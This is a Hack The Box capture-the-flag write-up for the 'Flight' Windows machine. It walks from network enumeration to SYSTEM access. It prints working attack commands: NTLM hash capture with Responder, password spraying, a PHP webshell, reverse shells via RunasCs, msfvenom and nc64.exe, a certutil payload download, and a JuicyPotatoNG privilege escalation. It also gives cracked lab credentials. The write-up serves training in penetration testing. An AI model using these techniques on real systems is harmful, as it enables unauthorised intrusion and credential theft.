# HTB - Flight

#### Ip: 10.10.11.187
#### Name: Flight
#### Rating: Hard

----------------------------------------------------------------------

Flight.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.11.187      
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-10 10:46 CST
Nmap scan report for 10.10.11.187
Host is up (0.087s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-10 23:47:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-10T23:48:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.23 seconds
```

With ports 53 (DNS),88 (Kerberos), and 389/3268 (LDAP), It's looking like we've got a DC here.

Reviewing the Nmap scan lets also add flight.htb to our `/etc/hosts` file. 

Checking out the webpage on port 80 we find a static flight booking page:

flight_site.png

Afer not finding anything interesting directory fuzzing, I tried vhost fuzzing and found school.flight.htb:

```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" --hw 530
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                     
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"                                                    

Total time: 44.53788
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 112.0170
```

Lets add that to `/etc/hosts` as well. 

Navigating to the vhst we find a page for flight school:

flight_internal.png

Clicking around the site we see different pages are redirected:

```
http://school.flight.htb/index.php?view=about.html
```

Lets try setting up a Responder listener and seeing if the page will call back:

```
http://school.flight.htb/index.php?view=//10.10.14.60/testing/
```

```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ sudo responder -I tun0
[sudo] password for ryan: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

```

Nice, we got a hit back and now have the svc_apache hash!


flight_apache_hash.png

Lets try to crack this with John:


flight_john1.png

Cool, we now have the credentials `svc_apache:S@Ss!K@*t13`

Seeing if we have read access to any SMB shares now, we find we can read several:

flight_shares.png

Before moving on from CME, lets use the `--rid-brute` to enumerate users:

flight_rid.png

Nice, we've found several. Lets add them to a file called users.txt

After not finding much of interest in the SMB shares, I decided to try spraying the passowrd we have against our users list:

```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\G0$:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
```

Nice, it looks like S.Moon is using the same password as svc_apache.

Unfortuantely we still don't  have local auth privileges on the target, but what is interesting is we now have both read and write access to the Shared SMB share, whereas svc_apache only had read permissions.

This makes me think we may be able to achieve more NTLM theft by puting a malicious file in the Shared share, setting up another Responder listener, and capturing the hash of whoever click on our file; just like we did for svc_apache.

Unfortunately the attempts I made were getting denied:

```
smb: \> put shell.url
NT_STATUS_ACCESS_DENIED opening remote file \shell.url
...

smb: \> put shell.scf
NT_STATUS_ACCESS_DENIED opening remote file \shell.scf
```

Lets now use https://github.com/Greenwolf/ntlm_theft to genrate more payloads and see if any of these can get loaded. 

```
┌──(ryan㉿kali)-[/opt/ntlm_theft]
└─$ sudo python ntlm_theft.py -g all -s 10.10.14.60 -f click_me
Created: click_me/click_me.scf (BROWSE TO FOLDER)
Created: click_me/click_me-(url).url (BROWSE TO FOLDER)
Created: click_me/click_me-(icon).url (BROWSE TO FOLDER)
Created: click_me/click_me.lnk (BROWSE TO FOLDER)
Created: click_me/click_me.rtf (OPEN)
Created: click_me/click_me-(stylesheet).xml (OPEN)
Created: click_me/click_me-(fulldocx).xml (OPEN)
Created: click_me/click_me.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: click_me/click_me-(includepicture).docx (OPEN)
Created: click_me/click_me-(remotetemplate).docx (OPEN)
Created: click_me/click_me-(frameset).docx (OPEN)
Created: click_me/click_me-(externalcell).xlsx (OPEN)
Created: click_me/click_me.wax (OPEN)
Created: click_me/click_me.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: click_me/click_me.asx (OPEN)
Created: click_me/click_me.jnlp (OPEN)
Created: click_me/click_me.application (DOWNLOAD AND OPEN)
Created: click_me/click_me.pdf (OPEN AND ALLOW)
Created: click_me/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: click_me/Autorun.inf (BROWSE TO FOLDER)
Created: click_me/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

Once I've generated the payloads I can load them all into the share and cross my fingers one gets through and gets clicked on:

```
┌──(ryan㉿kali)-[/opt/ntlm_theft/click_me]
└─$ smbclient //10.10.11.187/Shared -U S.Moon
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> prompt false
smb: \> mput *
NT_STATUS_ACCESS_DENIED opening remote file \click_me.pdf
NT_STATUS_ACCESS_DENIED opening remote file \click_me.rtf
NT_STATUS_ACCESS_DENIED opening remote file \click_me-(icon).url
putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)
putting file click_me.application as \click_me.application (8.1 kb/s) (average 2.9 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \click_me.m3u
NT_STATUS_ACCESS_DENIED opening remote file \click_me.wax
NT_STATUS_ACCESS_DENIED opening remote file \click_me-(remotetemplate).docx
putting file click_me.jnlp as \click_me.jnlp (0.9 kb/s) (average 2.3 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \click_me.lnk
NT_STATUS_ACCESS_DENIED opening remote file \click_me-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \click_me-(externalcell).xlsx
putting file click_me-(fulldocx).xml as \click_me-(fulldocx).xml (129.1 kb/s) (average 54.4 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \click_me.scf
NT_STATUS_ACCESS_DENIED opening remote file \click_me.asx
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
NT_STATUS_ACCESS_DENIED opening remote file \click_me-(frameset).docx
NT_STATUS_ACCESS_DENIED opening remote file \click_me-(url).url
NT_STATUS_ACCESS_DENIED opening remote file \click_me.htm
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
putting file click_me-(stylesheet).xml as \click_me-(stylesheet).xml (0.8 kb/s) (average 47.5 kb/s)
smb: \> ls
  .                                   D        0  Sat Feb 10 19:42:16 2024
  ..                                  D        0  Sat Feb 10 19:42:16 2024
  click_me-(fulldocx).xml             A    72585  Sat Feb 10 19:42:15 2024
  click_me-(stylesheet).xml           A      163  Sat Feb 10 19:42:16 2024
  click_me.application                A     1650  Sat Feb 10 19:42:14 2024
  click_me.jnlp                       A      192  Sat Feb 10 19:42:15 2024
  desktop.ini                         A       47  Sat Feb 10 19:42:14 2024

		5056511 blocks of size 4096. 1238287 blocks available
```

Cool, looks like a few got though. And just a few seconds later we get a call back to our Responder listener:

flight_cbum_hash.png

Lets load this into John and try to crack it:

flight_john2.png

Nice, we now have another set of credentials `c.bum:Tikkycoll_431012284`

Still unable to logon anywhere with discovered credentials, I see what permissions c.bum has over SMB shares, and discover they have write access to the Web share. This is promising!

flight_cbum_shares.png


First lets create a simple PHP webshell:
```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ cat cmd.php                               
<?php system($_GET["cmd"]); ?>
```

We can then use the `put` command to load it to the flight.htb Web share:

```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ smbclient //10.10.11.187/Web -U c.bum
Password for [WORKGROUP\c.bum]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Feb 10 20:02:00 2024
  ..                                  D        0  Sat Feb 10 20:02:00 2024
  flight.htb                          D        0  Sat Feb 10 20:02:00 2024
  school.flight.htb                   D        0  Sat Feb 10 20:02:00 2024

		5056511 blocks of size 4096. 1237309 blocks available
smb: \> cd flight.htb
smb: \flight.htb\> ls
  .                                   D        0  Sat Feb 10 20:02:00 2024
  ..                                  D        0  Sat Feb 10 20:02:00 2024
  css                                 D        0  Sat Feb 10 20:02:00 2024
  images                              D        0  Sat Feb 10 20:02:00 2024
  index.html                          A     7069  Wed Feb 23 23:58:10 2022
  js                                  D        0  Sat Feb 10 20:02:00 2024

		5056511 blocks of size 4096. 1237309 blocks available
smb: \flight.htb\> put cmd.php
putting file cmd.php as \flight.htb\cmd.php (0.1 kb/s) (average 0.1 kb/s)
```

Next we can confirm we have code execution by navigating to:

http://flight.htb/cmd.php?cmd=whoami

flight_webshell.png

Awesome. Lets now set up a netcat listener and grab a Powershell reverse shell and URL encode it.

(Note you'll want to move pretty fast here. The cmd.php file is being scrubbed away fairly quickly.)

Entering the one liner into the cmd prompt gets us a shell back as svc_apache:

```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ nc -lnvp 443                                                                                   
listening on [any] 443 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.187] 50193
whoami
flight\svc_apache
PS C:\xampp\htdocs\flight.htb> hostname
g0
```

Still unable to access the user.txt flag, I load winPEAS to help enumerate a privesc vector.

Going through the output I see that the box is also internally open on port 8000.

```
TCP        0.0.0.0               8000          0.0.0.0               0               Listening
```

Also of interest, this box has both an `C:\intetpub` directory, as well as a `C:\xampp` directory. Poking around more I find that the `development` folder is not writable by my user, but c.bum is able to write to it:

```
PS C:\inetpub> icacls development
development flight\C.Bum:(OI)(CI)(W)
            NT SERVICE\TrustedInstaller:(I)(F)
            NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(RX)
            BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

Since we have c.bum's credentials lets copy over https://github.com/antonioCoco/RunasCs to get a working shell as c.bum.

Once transfered to the target I can set up a listener and run:

```
PS C:\temp> .\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.60:4444
[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-88dbd$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1892 created in background.
```

Getting us a shell back as user c.bum
```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.187] 50617
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
flight\c.bum
```

And we can now grab the user.txt flag:

flight_user.png

### Privilege Escalation

Now that we have a shell as user C.Bum, lets add a shell.aspx file to the development folder, which we think is the site running internally on port 8000.

We can create this with msfvenom:
````
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.60 LPORT=1234 -a x64 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3416 bytes
````
```
C:\inetpub\development>certutil -urlcache -split -f "http://10.10.14.60/shell.aspx"
certutil -urlcache -split -f "http://10.10.14.60/shell.aspx"
****  Online  ****
  0000  ...
  0d58
CertUtil: -URLCache command completed successfully.
```

Once we've transfered our shell.exe file, lets now copy over Chisel to set up some port forwarding so we can access port 8000 running internally.

Once Chisel is on the target we can run in Kali:

```
./chisel_1.8.1_linux_arm64 server -p 1111 --reverse
```

And then on the target:

```
.\chisel_1.8.1_windows_amd64 client 10.10.14.60:1111 R:8000:127.0.0.1:8000
```

We can now acces the internal page on port 8000:

flight_internal_page.png

And navigate to http://127.0.0.1/shell.aspx to trigger our shell:

```
┌──(ryan㉿kali)-[~/HTB/Flight]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.187] 50890
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Running `whoami /all` we see the SEImpersonate privilege is set:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Lets use Juicy-PotatoNG to exploit this:

```
C:\temp>juicypotatong.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\temp\nc64.exe 10.10.14.60 445 -e cmd"
```

For a shell back as NT System:

```
┌──(ryan㉿kali)-[~/Tools/privesc]
└─$ nc -lnvp 445
listening on [any] 445 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.187] 51049
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
```

And we can now grab the final flag:

flight_root.png

Thanks for following along!

-Ryan